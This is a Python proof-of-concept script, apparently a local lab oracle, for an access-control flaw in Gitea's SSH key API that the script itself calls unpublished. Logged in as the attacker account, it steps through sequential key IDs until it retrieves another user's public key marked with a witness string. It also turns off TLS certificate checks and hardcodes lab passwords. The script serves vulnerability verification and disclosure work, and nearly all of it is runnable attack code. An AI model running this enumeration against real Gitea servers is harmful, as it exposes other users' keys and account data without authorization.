#!/usr/bin/env python3
"""Local oracle for Gitea unpublished #1: GET /api/v1/user/keys/{id} IDOR.

Authenticated attacker walks sequential key IDs. GetPublicKeyByID has no owner
check, so another user's SSH public key (title + material) is returned.

Witness is GHSA-GITEA-KEY-IDOR-WITNESS in the victim key title, not eval/shell.
Loopback only.
"""
from __future__ import annotations

import base64
import json
import ssl
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Any

LABEL = "Gitea #1 user/keys IDOR"
WITNESS = "GHSA-GITEA-KEY-IDOR-WITNESS"
DEFAULT_BASE = "http://127.0.0.1:18101"
USER_AGENT = "gitea-key-idor-lab"
HTTP_TIMEOUT_S = 30
KEY_ID_MIN = 1
KEY_ID_MAX_EXCLUSIVE = 32
PASSWORD = "LabPass123!"
VICTIM_USER = "victim"
ATTACKER_USER = "attacker"
SSL_CONTEXT = ssl._create_unverified_context()


@dataclass(frozen=True)
class Config:
    base: str
    attacker: tuple[str, str]
    victim: tuple[str, str]


def fail(reason: str) -> int:
    print(f"FAIL {reason}")
    return 1


def load_config(argv: list[str]) -> Config:
    base = (argv[1] if len(argv) > 1 else DEFAULT_BASE).rstrip("/")
    return Config(
        base=base,
        attacker=(ATTACKER_USER, PASSWORD),
        victim=(VICTIM_USER, PASSWORD),
    )


def request(
    cfg: Config,
    method: str,
    path: str,
    data: dict[str, Any] | None = None,
    auth: tuple[str, str] | None = None,
) -> tuple[int, str]:
    headers = {"Content-Type": "application/json", "User-Agent": USER_AGENT}
    if auth is not None:
        token = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
        headers["Authorization"] = "Basic " + token
    body = None if data is None else json.dumps(data).encode()
    req = urllib.request.Request(cfg.base + path, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT_S, context=SSL_CONTEXT) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def main() -> int:
    cfg = load_config(sys.argv)
    print(f"IOC base={cfg.base}")
    status, body = request(cfg, "GET", "/api/v1/version")
    print(f"IOC version status={status} snippet={body[:120]!r}")

    own_status, own_body = request(cfg, "GET", "/api/v1/user/keys", auth=cfg.attacker)
    print(f"IOC attacker-list status={own_status} snippet={own_body[:180]!r}")
    if own_status != 200:
        return fail("attacker cannot list own keys")
    if WITNESS in own_body:
        return fail("witness already in attacker key list (fixture leak)")

    hit: tuple[int, str] | None = None
    for key_id in range(KEY_ID_MIN, KEY_ID_MAX_EXCLUSIVE):
        status, body = request(cfg, "GET", f"/api/v1/user/keys/{key_id}", auth=cfg.attacker)
        print(f"IOC get id={key_id} status={status} snippet={body[:160]!r}")
        if status == 200 and WITNESS in body:
            hit = (key_id, body)
            break
    if hit is None:
        return fail("no foreign key with witness")

    kid, _body = hit
    own_ids = {entry.get("id") for entry in json.loads(own_body)}
    if kid in own_ids:
        return fail("hit id belongs to attacker")
    print(f"IOC idor-id={kid} attacker-ids={sorted(own_ids)}")
    print(f"SUCCESS {LABEL}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
